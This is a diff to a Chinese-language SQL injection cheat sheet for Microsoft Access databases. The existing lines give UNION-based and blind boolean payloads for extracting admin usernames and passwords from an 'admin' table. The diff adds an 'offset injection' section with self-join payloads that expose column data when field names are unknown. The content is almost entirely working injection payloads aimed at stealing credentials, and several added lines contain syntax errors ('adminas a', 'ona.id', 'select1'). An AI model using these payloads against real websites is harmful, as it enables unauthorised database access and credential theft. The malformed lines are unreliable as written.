@@ -15,7 +15,7 @@
 
 ```sql
     常规判断注入点，查询列数，Access只有一个库
-    Order by NUM  代表查询的列名的数目有NUM个
+    判断字段数: order by NUM   //根据页面反应得出字段数
     查表: UNION SELECT num,num+1... from admin
     查数据: UNION SELECT 1,admin,3,password from admin
 ```
@@ -30,6 +30,21 @@
            1.and (select top 1 len(列名) from admin)=5  //=换成<=5也成立，下同
            2.and (select top 1 asc(mid(列名,位数,1)) from admin)=97
 ```
+###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 偏移注入(能查表，不能查字段)
+
+```sql
+    判断字段数: order by NUM   //根据页面反应得出字段数
+    爆出显示位: UNION SELECT 1,2,...,NUM from 表名
+    查字段:union select1,2,3,4,5,6,7,8,9,10,* from admin 直到页面正常，否则不断用 * 代替减少NUM数
+    
+    字段数=order by 出的字段数-*号的字段数x2
+    偏移注入: union select 1,2,3,4,5,6,7,8,9,10,* from (adminas a inner join admin as b ona.id=b.id)
+            1,2,3,4,5,6,7,8,9,10, //上述公式这里理解为剩下的字段数就可以
+```
+
+
+
+
 
 
 
